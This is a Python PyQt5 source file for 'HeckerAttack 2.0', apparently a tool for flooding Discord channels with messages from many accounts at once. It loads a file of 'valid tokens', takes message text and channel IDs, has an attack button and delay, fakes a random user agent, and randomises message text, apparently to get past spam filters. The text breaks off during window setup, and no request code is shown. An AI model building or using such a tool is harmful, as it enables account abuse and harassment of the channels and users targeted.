# -*- coding: utf-8 -*-

from re import findall
import random
from os import _exit
from sys import argv
from os.path import expanduser, isfile, split
from time import sleep, time
from random import randint, seed
from threading import Thread
from time import sleep, time
from random import randint, seed

try:
    import clipboard
    from PyQt5 import QtCore, QtGui, QtWidgets
    import requests
    from fake_useragent import UserAgent as UAgent

except:
    from os import system
    from sys import executable

    requirements = ['clipboard', 'pyqt5', 'requests', 'fake-useragent']

    print('У вас не установлены все необходимые модули.')
    print('Нажмите Enter, чтобы начать установку.')

    print()

    print('Это действие установит следующие модули:')

    for module in requirements:
        print(f'> {module}')

    try:
        input()

    except:
        pass

    for module in requirements:
        system(f'{executable} -m pip install {module}')

    print('Установка завершена.')

    import clipboard
    from PyQt5 import QtCore, QtGui, QtWidgets
    import requests
    from fake_useragent import UserAgent as UAgent

AppLocation = split(__file__)[0].replace('\\', '/')


def GetResourcePath(Filename):
    return AppLocation + '/resources/' + Filename


Home = expanduser('~')


class AllowWindowMovement:
    WarningWindow = False
    MainWindow = False
    LogsWindow = False


class APPState:
    LogsWindowIsOpened = False
    LogsText = ''
    LogWriteLimit = 50


class ValidThreadIDS:
    LogWriteLimitUpdateValidID = 0
    UpdateLogsThreadValidID = 0


def LogWrite(WriteString):
    text = APPState.LogsText

    if text == '':
        text = [WriteString]
    elif text.count('\n') == 0:
        text = [WriteString, text]
    else:
        text = text.split('\n')
        text.insert(0, WriteString)

    if len(text) > APPState.LogWriteLimit:
        text = text[:APPState.LogWriteLimit]

    APPState.LogsText = '\n'.join(text)


class PYQTHoverButton(QtWidgets.QPushButton):
    HoverSignal = QtCore.pyqtSignal(str)

    def __init__(self, parent=None):
        super(PYQTHoverButton, self).__init__(parent)

    def enterEvent(self, event):
        self.HoverSignal.emit('enterEvent')

    def leaveEvent(self, event):
        self.HoverSignal.emit('leaveEvent')


class PYQTHoverLabel(QtWidgets.QLabel):
    HoverSignal = QtCore.pyqtSignal(str)

    def __init__(self, parent=None):
        super(PYQTHoverLabel, self).__init__(parent)

    def enterEvent(self, event):
        self.HoverSignal.emit('enterEvent')

    def leaveEvent(self, event):
        self.HoverSignal.emit('leaveEvent')


class Ui_LogsWindow(QtWidgets.QMainWindow):
    IsPinned = False
    UpdateSignal = QtCore.pyqtSignal(int)

    def InitWindow(self, LogsWindow):
        APPState.LogsWindowIsOpened = True
        LogsWindow.setObjectName('MainWindow')
        LogsWindow.resize(351, 291)
        LogsWindow.setMinimumSize(QtCore.QSize(351, 291))
        LogsWindow.setMaximumSize(QtCore.QSize(351, 291))
        LogsWindow.setStyleSheet(
            'QToolTip {\n'
            '    background-color: rgb(60, 63, 69);\n'
            '    border: black solid 1px;\n'
            '    border-radius: 3;\n'
            '    color: rgb(200, 200, 200);\n'
            '    font: 87 10pt \'Segoe UI Black\';\n'
            '}\n'
            '\n'
            'QScrollBar:vertical {\n'
            '    border: none;\n'
            '    background: rgb(32, 34, 37);\n'
            '    width: 15px;\n'
            '    margin: 15px 0 15px 0;\n'
            '}\n'
            'QScrollBar::handle:vertical {    \n'
            '    background-color: rgb(54, 57, 63);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::handle:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::handle:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::sub-line:vertical {\n'
            '    border: none;\n'
            '    background-color: rgb(54, 57, 63);\n'
            '    height: 10px;\n'
            '    border-radius: 3px;\n'
            '    subcontrol-position: top;\n'
            '    subcontrol-origin: margin;\n'
            '}\n'
            'QScrollBar::sub-line:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '}\n'
            'QScrollBar::sub-line:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '}\n'
            'QScrollBar::add-line:vertical {\n'
            '    border: none;\n'
            '    background-color: rgb(54, 57, 63);\n'
            '    height: 10px;\n'
            '    border-radius: 3px;\n'
            '    subcontrol-position: bottom;\n'
            '    subcontrol-origin: margin;\n'
            '}\n'
            'QScrollBar::add-line:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '}\n'
            'QScrollBar::add-line:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '}\n'
            'QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {\n'
            '    background: none;\n'
            '}\n'
            'QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {\n'
            '    background: none;\n'
            '}\n'
            '\n'
            'QPlainTextEdit {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 3;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}\n'
            '\n'
            'QPlainTextEdit:hover {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    border-style: solid;\n'
            '    border-width: 3;\n'
            '    border-color: rgb(41, 43, 47);\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 3;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}')
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.CentralWidget = QtWidgets.QWidget(LogsWindow)
        self.CentralWidget.setObjectName('centralwidget')
        self.MainBG = PYQTHoverLabel(self.CentralWidget)
        self.MainBG.setGeometry(QtCore.QRect(0, 0, 351, 291))
        self.MainBG.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                  'border-radius: 10')
        self.MainBG.setObjectName('MainBG')
        self.CloseButton = PYQTHoverButton(self.CentralWidget)
        self.CloseButton.setGeometry(QtCore.QRect(315, 5, 31, 26))
        self.CloseButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.CloseButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(234, 65, 68);\n'
            '    border-radius: 5\n'
            '}\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(216, 60, 63);\n'
            '    border-radius: 5\n'
            '}')
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(GetResourcePath('close.png')),
                       QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.CloseButton.setIcon(icon)
        self.CloseButton.setObjectName('CloseButton')
        self.PinButton = PYQTHoverButton(self.CentralWidget)
        self.PinButton.setGeometry(QtCore.QRect(280, 5, 31, 26))
        self.PinButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.PinButton.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                     'border-radius: 5')
        icon1 = QtGui.QIcon()
        icon1.addPixmap(QtGui.QPixmap(GetResourcePath('pin.png')),
                        QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.PinButton.setIcon(icon1)
        self.PinButton.setObjectName('PinButton')
        self.HideButton = PYQTHoverButton(self.CentralWidget)
        self.HideButton.setGeometry(QtCore.QRect(245, 5, 31, 26))
        self.HideButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.HideButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(47, 49, 54);\n'
            '    border-radius: 5\n'
            '}\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(60, 63, 69);\n'
            '    border-radius: 5\n'
            '}')
        icon2 = QtGui.QIcon()
        icon2.addPixmap(QtGui.QPixmap(GetResourcePath('hide.png')),
                        QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.HideButton.setIcon(icon2)
        self.HideButton.setObjectName('HideButton')
        self.WindowTitleLabel = PYQTHoverLabel(self.CentralWidget)
        self.WindowTitleLabel.setGeometry(QtCore.QRect(10, 5, 36, 26))
        self.WindowTitleLabel.setStyleSheet(
            'color: rgb(200, 200, 200);\n'
            'font: 87 10pt \'Segoe UI Black\';')
        self.WindowTitleLabel.setAlignment(QtCore.Qt.AlignLeading
                                           | QtCore.Qt.AlignLeft
                                           | QtCore.Qt.AlignVCenter)
        self.WindowTitleLabel.setObjectName('WindowTitleLabel')
        self.FormBG = PYQTHoverLabel(self.CentralWidget)
        self.FormBG.setGeometry(QtCore.QRect(5, 35, 341, 206))
        self.FormBG.setStyleSheet('background-color: rgb(54, 57, 63);\n'
                                  'border-radius: 10')
        self.FormBG.setObjectName('FormBG')
        self.Logs = QtWidgets.QPlainTextEdit(self.CentralWidget)
        self.Logs.setGeometry(QtCore.QRect(15, 45, 321, 156))
        self.Logs.setReadOnly(True)
        self.Logs.setObjectName('Logs')
        self.LimitHint = PYQTHoverLabel(self.CentralWidget)
        self.LimitHint.setGeometry(QtCore.QRect(15, 210, 46, 21))
        self.LimitHint.setStyleSheet('color: rgb(175, 177, 181);\n'
                                     'font: 87 8pt \'Segoe UI Black\';')
        self.LimitHint.setAlignment(QtCore.Qt.AlignLeading
                                    | QtCore.Qt.AlignLeft
                                    | QtCore.Qt.AlignVCenter)
        self.LimitHint.setObjectName('LimitHint')
        self.Limit = QtWidgets.QSpinBox(self.CentralWidget)
        self.Limit.setGeometry(QtCore.QRect(65, 210, 42, 22))
        self.Limit.setStyleSheet('QSpinBox {\n'
                                 '    background-color: rgb(32, 34, 37);\n'
                                 '    border-radius: 4;\n'
                                 '    font: 87 8pt \'Segoe UI Black\';\n'
                                 '    color: rgb(255, 255, 255);\n'
                                 '    padding-left: 2;\n'
                                 '    padding-right: 3;\n'
                                 '    padding-top: 3;\n'
                                 '    padding-bottom: 3\n'
                                 '}\n'
                                 '\n'
                                 'QSpinBox:hover {\n'
                                 '    background-color: rgb(32, 34, 37);\n'
                                 '    border-radius: 4;\n'
                                 '    border-style: solid;\n'
                                 '    border-width: 3;\n'
                                 '    border-color: rgb(41, 43, 47);\n'
                                 '    font: 87 8pt \'Segoe UI Black\';\n'
                                 '    color: rgb(255, 255, 255);\n'
                                 '    padding-left: 2;\n'
                                 '    padding-right: 3;\n'
                                 '    padding-top: 3;\n'
                                 '    padding-bottom: 3\n'
                                 '}')
        self.Limit.setButtonSymbols(QtWidgets.QAbstractSpinBox.NoButtons)
        self.Limit.setMinimum(10)
        self.Limit.setMaximum(500)
        self.Limit.setSingleStep(5)
        self.Limit.setProperty('value', APPState.LogWriteLimit)
        self.Limit.setObjectName('Limit')
        self.LimitHintLines = PYQTHoverLabel(self.CentralWidget)
        self.LimitHintLines.setGeometry(QtCore.QRect(110, 210, 41, 21))
        self.LimitHintLines.setStyleSheet('color: rgb(175, 177, 181);\n'
                                          'font: 87 8pt \'Segoe UI Black\';')
        self.LimitHintLines.setAlignment(QtCore.Qt.AlignLeading
                                         | QtCore.Qt.AlignLeft
                                         | QtCore.Qt.AlignVCenter)
        self.LimitHintLines.setObjectName('LimitHintLines')
        self.Clear = PYQTHoverButton(self.CentralWidget)
        self.Clear.setGeometry(QtCore.QRect(255, 250, 86, 31))
        self.Clear.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.Clear.setStyleSheet('QPushButton {\n'
                                 '    background-color: rgb(88, 101, 242);\n'
                                 '    border-radius: 3;\n'
                                 '    font: 87 8pt \'Segoe UI Black\';\n'
                                 '    color: rgb(255, 255, 255);\n'
                                 '}\n'
                                 '\n'
                                 'QPushButton:hover {\n'
                                 '    background-color: rgb(81, 93, 224);\n'
                                 '    border-radius: 3;\n'
                                 '    font: 87 8pt \'Segoe UI Black\';\n'
                                 '    color: rgb(255, 255, 255);\n'
                                 '}'
                                 'QPushButton:pressed {\n'
                                 '    background-color: rgb(64, 73, 177);\n'
                                 '    border-radius: 3;\n'
                                 '    font: 87 8pt \'Segoe UI Black\';\n'
                                 '    color: rgb(255, 255, 255)\n'
                                 '}')
        self.Clear.setObjectName('Clear')
        self.Copy = PYQTHoverButton(self.CentralWidget)
        self.Copy.setGeometry(QtCore.QRect(145, 250, 101, 31))
        self.Copy.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.Copy.setStyleSheet('QPushButton {\n'
                                '    background-color: rgb(59, 165, 93);\n'
                                '    border-radius: 3;\n'
                                '    font: 87 8pt \'Segoe UI Black\';\n'
                                '    color: rgb(255, 255, 255)\n'
                                '}\n'
                                '\n'
                                'QPushButton:hover {\n'
                                '    background-color: rgb(53, 149, 84);\n'
                                '    border-radius: 3;\n'
                                '    font: 87 8pt \'Segoe UI Black\';\n'
                                '    color: rgb(255, 255, 255)\n'
                                '}'
                                'QPushButton:pressed {\n'
                                '    background-color: rgb(44, 124, 70);\n'
                                '    border-radius: 3;\n'
                                '    font: 87 8pt \'Segoe UI Black\';\n'
                                '    color: rgb(255, 255, 255)\n'
                                '}')
        self.Copy.setObjectName('Copy')
        self.WindowMovementHitbox = PYQTHoverLabel(self.CentralWidget)
        self.WindowMovementHitbox.setGeometry(QtCore.QRect(50, 5, 195, 26))
        self.WindowMovementHitbox.setStyleSheet(
            'background-color: rgb(47, 49, 54)')
        self.WindowMovementHitbox.setObjectName('WindowMovementHitbox')
        LogsWindow.setCentralWidget(self.CentralWidget)

        QtCore.QMetaObject.connectSlotsByName(LogsWindow)

        LogsWindow.setWindowTitle('HeckerAttack 2.0 - Logs')
        self.CloseButton.setToolTip('Закрыть')
        self.PinButton.setToolTip('Закрепить окно на переднем плане')
        self.HideButton.setToolTip('Свернуть')
        self.WindowTitleLabel.setText('Логи')
        self.Logs.setPlaceholderText('В логах пусто')
        self.LimitHint.setText('ЛИМИТ')
        self.LimitHintLines.setText('СТРОК')
        self.Clear.setText('Очистить')
        self.Copy.setText('Копировать')

        self.WindowTitleLabel.HoverSignal.connect(self.ChangeWindowMovement)
        self.WindowMovementHitbox.HoverSignal.connect(
            self.ChangeWindowMovement)
        self.PinButton.HoverSignal.connect(self.PinButtonHoverEvent)

        self.CloseButton.clicked.connect(self.Close)
        self.HideButton.clicked.connect(self.showMinimized)
        self.PinButton.clicked.connect(self.PinWindow)

        self.Clear.clicked.connect(self.ClearLogs)
        self.Copy.clicked.connect(self.CopyLogs)

        self.UpdateSignal.connect(self.UpdateLogs)

        seed(time())

        ValidThreadIDS.LogWriteLimitUpdateValidID = randint(
            1, 100000000000000000000000000)

        Thread(target=lambda: self.LogWriteLimitUpdate(
            ValidThreadIDS.LogWriteLimitUpdateValidID)).start()

        seed(time())

        ValidThreadIDS.UpdateLogsThreadValidID = randint(
            1, 100000000000000000000000000)

        Thread(target=lambda: self.UpdateLogsThread(
            ValidThreadIDS.UpdateLogsThreadValidID)).start()

    def PinButtonHoverEvent(self, event):
        if not self.IsPinned:
            if event == 'enterEvent':
                self.PinButton.setStyleSheet(
                    'background-color: rgb(60, 63, 69);\n'
                    'border-radius: 5')
            else:
                self.PinButton.setStyleSheet(
                    'background-color: rgb(47, 49, 54);\n'
                    'border-radius: 5')
        else:
            if event == 'enterEvent':
                self.PinButton.setStyleSheet(
                    'background-color: rgb(53, 149, 84);\n'
                    'border-radius: 5')
            else:
                self.PinButton.setStyleSheet(
                    'background-color: rgb(59, 165, 93);\n'
                    'border-radius: 5')

    def ClearLogs(self):
        APPState.LogsText = ''

    def CopyLogs(self):
        clipboard.copy(APPState.LogsText)

    def UpdateLogs(self):
        if self.Logs.toPlainText() != APPState.LogsText:
            self.Logs.setPlainText(APPState.LogsText)

    def UpdateLogsThread(self, ID):
        while APPState.LogsWindowIsOpened and ValidThreadIDS.UpdateLogsThreadValidID == ID:
            sleep(.05)
            self.UpdateSignal.emit(1)

    def LogWriteLimitUpdate(self, ID):
        while APPState.LogsWindowIsOpened and ValidThreadIDS.LogWriteLimitUpdateValidID == ID:
            APPState.LogWriteLimit = self.Limit.value()
            sleep(1)

    def Close(self):
        APPState.LogsWindowIsOpened = False
        self.close()

    def ChangeWindowMovement(self, event):
        if event == 'enterEvent':
            AllowWindowMovement.LogsWindow = True
        else:
            AllowWindowMovement.LogsWindow = False

    def PinWindow(self):
        self.IsPinned = not self.IsPinned

        if not self.IsPinned:
            self.PinButton.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                         'border-radius: 5')
        else:
            self.PinButton.setStyleSheet(
                'background-color: rgb(59, 165, 93);\n'
                'border-radius: 5')

        if self.IsPinned:
            self.setWindowFlags(self.windowFlags()
                                | QtCore.Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags()
                                & ~QtCore.Qt.WindowStaysOnTopHint)
            self.show()


class LogsWindow(Ui_LogsWindow):

    def __init__(self):
        super().__init__()
        self.InitWindow(self)

    def mousePressEvent(self, event):
        if AllowWindowMovement.LogsWindow:
            try:
                if event.button() == QtCore.Qt.LeftButton:
                    self.old_pos = event.pos()
            except:
                pass

    def mouseReleaseEvent(self, event):
        if AllowWindowMovement.LogsWindow:
            try:
                if event.button() == QtCore.Qt.LeftButton:
                    self.old_pos = None
            except:
                pass

    def mouseMoveEvent(self, event):
        if AllowWindowMovement.LogsWindow:
            try:
                if not self.old_pos:
                    return
                delta = event.pos() - self.old_pos
                self.move(self.pos() + delta)
            except:
                pass


def ParseString(Content):
    if not ('?digit' in Content or '?letter' in Content or '?prep' in Content
            or '?char' in Content):
        return Content

    for x in range(Content.count('?digit')):
        Content = Content.replace('?digit', str(random.randint(0, 9)), 1)

    for x in range(Content.count('?letter')):
        Content = Content.replace('?letter',
                                  random.choice('QWERTYUIOPASDFGHJKLZXCVBNM'),
                                  1)

    for x in range(Content.count('?prep')):
        Content = Content.replace('?prep', random.choice('.!?'), 1)

    if '?char' in Content:
        SearchRandchar = findall('\?char \d+,\s*\d+', Content)

        for Search in SearchRandchar:
            Values = Search.replace('?char ', '').split(',')
            Start = int(Values[0])
            End = int(Values[1])

            if Start >= End:
                raise TypeError('Минимальное число не может ' +
                                'быть больше максимального')

            if Start < 0 or End < 0:
                raise TypeError('?char <start> или ?char <end>' +
                                ' не может быть меньше 0')

            Content = Content.replace(Search, chr(random.randint(Start, End)))

    return Content


class Ui_MainWindow(QtWidgets.QMainWindow):

    IsPinned = False
    IsChecking = False
    IsWorking = False

    TokenHintChangeSignal = QtCore.pyqtSignal(dict)
    ChannelsHintChangeSignal = QtCore.pyqtSignal(dict)
    TextHintChangeSignal = QtCore.pyqtSignal(dict)
    MainButtonChangeSignal = QtCore.pyqtSignal(dict)

    Property_WindowSizeX = 286
    Property_WindowSizeY = 459

    UserAgent = UAgent().random

    def InitWindow(self, MainWindow):
        MainWindow.setObjectName('MainWindow')
        MainWindow.resize(self.Property_WindowSizeX, self.Property_WindowSizeY)
        MainWindow.setMinimumSize(
            QtCore.QSize(self.Property_WindowSizeX, self.Property_WindowSizeY))
        MainWindow.setMaximumSize(
            QtCore.QSize(self.Property_WindowSizeX, self.Property_WindowSizeY))
        MainWindow.setStyleSheet(
            'QToolTip {\n'
            '    background-color: rgb(60, 63, 69);\n'
            '    border: black solid 1px;\n'
            '    border-radius: 3;\n'
            '    color: rgb(200, 200, 200);\n'
            '    font: 87 10pt \'Segoe UI Black\';\n'
            '}\n'
            '\n'
            'QScrollBar:vertical {\n'
            '    border: none;\n'
            '    background: rgb(32, 34, 37);\n'
            '    width: 15px;\n'
            '    margin: 15px 0 15px 0;\n'
            '}\n'
            'QScrollBar::handle:vertical {    \n'
            '    background-color: rgb(54, 57, 63);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::handle:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::handle:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '    min-height: 15px;\n'
            '    border-radius: 3px;\n'
            '}\n'
            'QScrollBar::sub-line:vertical {\n'
            '    border: none;\n'
            '    background-color: rgb(54, 57, 63);\n'
            '    height: 10px;\n'
            '    border-radius: 3px;\n'
            '    subcontrol-position: top;\n'
            '    subcontrol-origin: margin;\n'
            '}\n'
            'QScrollBar::sub-line:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '}\n'
            'QScrollBar::sub-line:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '}\n'
            'QScrollBar::add-line:vertical {\n'
            '    border: none;\n'
            '    background-color: rgb(54, 57, 63);\n'
            '    height: 10px;\n'
            '    border-radius: 3px;\n'
            '    subcontrol-position: bottom;\n'
            '    subcontrol-origin: margin;\n'
            '}\n'
            'QScrollBar::add-line:vertical:hover {    \n'
            '    background-color: rgb(50, 53, 59);\n'
            '}\n'
            'QScrollBar::add-line:vertical:pressed {    \n'
            '    background-color: rgb(46, 49, 55);\n'
            '}\n'
            'QScrollBar::up-arrow:vertical, QScrollBar::down-arrow:vertical {\n'
            '    background: none;\n'
            '}\n'
            'QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {\n'
            '    background: none;\n'
            '}\n'
            '\n'
            'QPlainTextEdit {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 3;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}\n'
            '\n'
            'QPlainTextEdit:hover {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    border-style: solid;\n'
            '    border-width: 3;\n'
            '    border-color: rgb(41, 43, 47);\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 3;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}')
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.CentralWidget = QtWidgets.QWidget(MainWindow)
        self.CentralWidget.setObjectName('CentralWidget')
        self.FormBG = PYQTHoverLabel(self.CentralWidget)
        self.FormBG.setGeometry(QtCore.QRect(5, 35, 276, 371))
        self.FormBG.setStyleSheet('background-color: rgb(54, 57, 63);\n'
                                  'border-radius: 10')
        self.FormBG.setObjectName('FormBG')
        self.MainBG = PYQTHoverLabel(self.CentralWidget)
        self.MainBG.setGeometry(QtCore.QRect(0, 0, 286, 456))
        self.MainBG.setStyleSheet('background-color: rgb(47, 49, 54);\n'
                                  'border-radius: 10')
        self.MainBG.setObjectName('MainBG')
        self.WindowTitleLabel = PYQTHoverLabel(self.CentralWidget)
        self.WindowTitleLabel.setGeometry(QtCore.QRect(10, 5, 111, 26))
        self.WindowTitleLabel.setStyleSheet(
            'color: rgb(200, 200, 200);\n'
            'font: 87 10pt \'Segoe UI Black\';')
        self.WindowTitleLabel.setAlignment(QtCore.Qt.AlignLeading
                                           | QtCore.Qt.AlignLeft
                                           | QtCore.Qt.AlignVCenter)
        self.WindowTitleLabel.setObjectName('WindowTitleLabel')
        self.CloseButton = PYQTHoverButton(self.CentralWidget)
        self.CloseButton.setGeometry(QtCore.QRect(250, 5, 31, 26))
        self.CloseButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.CloseButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(234, 65, 68);\n'
            '    border-radius: 5\n'
            '}\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(216, 60, 63);\n'
            '    border-radius: 5\n'
            '}')
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(GetResourcePath('close.png')),
                       QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.CloseButton.setIcon(icon)
        self.CloseButton.setObjectName('CloseButton')
        self.AttackButton = PYQTHoverButton(self.CentralWidget)
        self.AttackButton.setGeometry(QtCore.QRect(190, 416, 86, 31))
        self.AttackButton.setCursor(QtGui.QCursor(
            QtCore.Qt.PointingHandCursor))
        self.AttackButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(88, 101, 242);\n'
            '    border-radius: 3;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '}\n'
            '\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(81, 93, 224);\n'
            '    border-radius: 3;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '}'
            'QPushButton:pressed {\n'
            '    background-color: rgb(64, 73, 177);\n'
            '    border-radius: 3;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255)\n'
            '}')
        self.AttackButton.setObjectName('AttackButton')
        self.LogsButton = PYQTHoverButton(self.CentralWidget)
        self.LogsButton.setGeometry(QtCore.QRect(125, 416, 56, 31))
        self.LogsButton.setCursor(QtGui.QCursor(QtCore.Qt.PointingHandCursor))
        self.LogsButton.setStyleSheet(
            'QPushButton {\n'
            '    background-color: rgb(59, 165, 93);\n'
            '    border-radius: 3;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255)\n'
            '}\n'
            '\n'
            'QPushButton:hover {\n'
            '    background-color: rgb(53, 149, 84);\n'
            '    border-radius: 3;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255)\n'
            '}'
            'QPushButton:pressed {\n'
            '    background-color: rgb(44, 124, 70);\n'
            '    border-radius: 3;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255)\n'
            '}')
        self.LogsButton.setObjectName('LogsButton')
        self.TokenInput = QtWidgets.QPlainTextEdit(self.CentralWidget)
        self.TokenInput.setGeometry(QtCore.QRect(15, 70, 256, 71))

        if isfile(Home + '/' + 'heckerattack_2.0_valid_tokens.txt'):
            File = open(Home + '/' + 'heckerattack_2.0_valid_tokens.txt', 'r')
            Tokens = File.read()
            File.close()

            self.TokenInput.setPlainText(Tokens.strip())

        self.TokenInput.setObjectName('TokenInput')
        self.TokenHint = PYQTHoverLabel(self.CentralWidget)
        self.TokenHint.setGeometry(QtCore.QRect(15, 45, 256, 21))
        self.TokenHint.setStyleSheet('color: rgb(175, 177, 181);\n'
                                     'font: 87 8pt \'Segoe UI Black\';')
        self.TokenHint.setAlignment(QtCore.Qt.AlignLeading
                                    | QtCore.Qt.AlignLeft
                                    | QtCore.Qt.AlignVCenter)
        self.TokenHint.setObjectName('TokenHint')
        self.TextHint = PYQTHoverLabel(self.CentralWidget)
        self.TextHint.setGeometry(QtCore.QRect(15, 155, 256, 21))
        self.TextHint.setStyleSheet('color: rgb(175, 177, 181);\n'
                                    'font: 87 8pt \'Segoe UI Black\';')
        self.TextHint.setAlignment(QtCore.Qt.AlignLeading | QtCore.Qt.AlignLeft
                                   | QtCore.Qt.AlignVCenter)
        self.TextHint.setObjectName('TextHint')
        self.TextInput = QtWidgets.QPlainTextEdit(self.CentralWidget)
        self.TextInput.setGeometry(QtCore.QRect(15, 180, 256, 71))
        self.TextInput.setObjectName('TextInput')
        self.ChannelsHint = PYQTHoverLabel(self.CentralWidget)
        self.ChannelsHint.setGeometry(QtCore.QRect(15, 266, 256, 21))
        self.ChannelsHint.setStyleSheet('color: rgb(175, 177, 181);\n'
                                        'font: 87 8pt \'Segoe UI Black\';')
        self.ChannelsHint.setAlignment(QtCore.Qt.AlignLeading
                                       | QtCore.Qt.AlignLeft
                                       | QtCore.Qt.AlignVCenter)
        self.ChannelsHint.setObjectName('ChannelsHint')
        self.ChannelsInput = QtWidgets.QPlainTextEdit(self.CentralWidget)
        self.ChannelsInput.setGeometry(QtCore.QRect(15, 291, 256, 71))
        self.ChannelsInput.setObjectName('ChannelsInput')
        self.DelayHint = PYQTHoverLabel(self.CentralWidget)
        self.DelayHint.setGeometry(QtCore.QRect(15, 371, 66, 21))
        self.DelayHint.setStyleSheet('color: rgb(175, 177, 181);\n'
                                     'font: 87 8pt \'Segoe UI Black\';')
        self.DelayHint.setAlignment(QtCore.Qt.AlignLeading
                                    | QtCore.Qt.AlignLeft
                                    | QtCore.Qt.AlignVCenter)
        self.DelayHint.setObjectName('DelayHint')
        self.AttackDelay = QtWidgets.QDoubleSpinBox(self.CentralWidget)
        self.AttackDelay.setGeometry(QtCore.QRect(85, 371, 26, 22))
        self.AttackDelay.setStyleSheet(
            'QDoubleSpinBox {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 2;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}\n'
            '\n'
            'QDoubleSpinBox:hover {\n'
            '    background-color: rgb(32, 34, 37);\n'
            '    border-radius: 4;\n'
            '    border-style: solid;\n'
            '    border-width: 3;\n'
            '    border-color: rgb(41, 43, 47);\n'
            '    font: 87 8pt \'Segoe UI Black\';\n'
            '    color: rgb(255, 255, 255);\n'
            '    padding-left: 2;\n'
            '    padding-right: 3;\n'
            '    padding-top: 3;\n'
            '    padding-bottom: 3\n'
            '}')
        self.AttackDelay.setButtonSymbols(QtWidgets.QAbstractSpinBox.NoButtons)
        self.AttackDelay.setDecimals(1)
        self.AttackDelay.setMaximum(9.9)
        self.AttackDelay.setSingleStep(0.1)
        self.AttackDelay.setObjectName('AttackDelay')
        self.DelaySecHint = PYQTHoverLabel(self.CentralWidget)
        self.DelaySecHint.setGeometry(QtCore.QRect(115, 371, 26, 21))
